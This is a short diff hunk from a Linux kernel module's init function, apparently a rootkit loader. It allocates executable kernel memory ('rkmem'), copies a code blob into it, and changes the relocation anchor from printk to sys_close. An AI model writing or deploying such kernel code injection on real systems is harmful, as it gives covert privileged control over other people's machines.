@@ -25,7 +25,7 @@ static int __init r0mod_init(void)
     rkmem = __vmalloc(8192 * 3, GFP_KERNEL, PAGE_KERNEL_EXEC);
     printk("<0>" "rkmem: 0x%p\n", rkmem);
 
-    reloc(rkmem, (void*)&printk);
+    reloc(rkmem, (void*)&sys_close);
     for(i = 0; i < klen; i++)
         *(rkmem + i) = *(unsigned char *)(kstart + i);
 
